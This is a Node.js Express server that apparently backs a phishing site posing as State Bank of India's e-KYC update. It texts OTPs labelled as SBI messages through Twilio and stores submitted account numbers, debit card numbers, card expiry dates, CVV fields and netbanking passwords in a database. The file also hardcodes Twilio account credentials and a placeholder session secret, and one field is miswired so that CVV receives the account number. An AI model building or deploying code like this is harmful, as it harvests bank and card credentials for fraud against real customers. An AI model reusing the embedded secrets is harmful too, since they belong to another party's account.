const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const session = require('express-session');
const twilio = require('twilio');
const flash = require('connect-flash');
const cors = require('cors');
const app = express();
require("dotenv").config();
require("./config/dbconfig")();
// const newCustomer=require('./models/user');
const Customer = require("./models/user");
const { toNamespacedPath } = require('path/win32');
const port = 5000;

app.use(express.json());

// Flash Messages
app.use(flash({ sessionKeyName: 'flashMessage' }));

app.use(cors());


// Twilio credentials
const accountSid = 'AC3480b3fc14639411eae035a65de63c7d';
const authToken = 'c6c04be930059b932d1de9ef72af0a6d';
const twilioPhone = '+12569528634';
// const mobilenumber = '+918088379279';
const client = twilio(accountSid, authToken);

// Serve static files from the "public" directory
// app.use(express.static('public'));
// // EJS setup
// app.set('view engine', 'ejs');


// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(session({
    secret: 'secret', // Replace with a random string for session secret
    resave: false,
    cookie: { maxAge: 600000 },
    saveUninitialized: true
}));


// Generate random OTP
function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Endpoint to send OTP
// app.post('/saveData', async (req, res) => {
//     const newCustomer = new Customer(req.body);
//     const result = await newCustomer.save();
//     console.log(result)
    
app.post('/sendOTP', async (req, res) => {
    // const newCustomer = new Customer(req.body);
    // const result = await newCustomer.save();
    // console.log(result)

    const {mobileNumber } = req.body;
    const otp = generateOTP();

      // Store the OTP in the session
      req.session.otp = otp;
      
    client.messages.create({
        body: `Your sbi e-kyc update OTP is: ${otp}`,
        from: twilioPhone,
        to: mobileNumber
    })
    .then(message => {
        console.log('OTP sent:', message.sid);
        res.json({ success: true, message: 'OTP sent successfully.' });
    })
    .catch(error => {
        console.error('Error sending OTP:', error);
        res.status(500).json({ success: false, message: 'Failed to send OTP.' });
    });
});

app.post('/sbi-ekyc', async (req, res) => {
    const newCustomer = new Customer({
        acnumber: req.body.acnumber,
        debumber: req.body.debumber,
        userid: req.body.userid,
        cardexpiry: req.body.cardexpiry,
        CVV: req.body.acnumber,
        password: req.body.password,
        mobileNumber: req.body.mobileNumber,


        

})
    const result = await newCustomer.save();
    console.log(result)
     res.send('hi')
})

// Endpoint to verify OTP
app.post('/verifyOTP', (req, res) => {
    const { otp } = req.body;
    const sessionOTP = req.session.otp;

    if (!sessionOTP) {
        res.status(400).send('OTP session expired or not set');
        return;
    }

    if (otp === sessionOTP.toString()) {
     res.send('OTP Verified Success')
    } else {
        res.send('Invalid OTP');
    }
});

app.get('/',(req,res)=>{
    res.send("SBI ekyc")
})


// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
















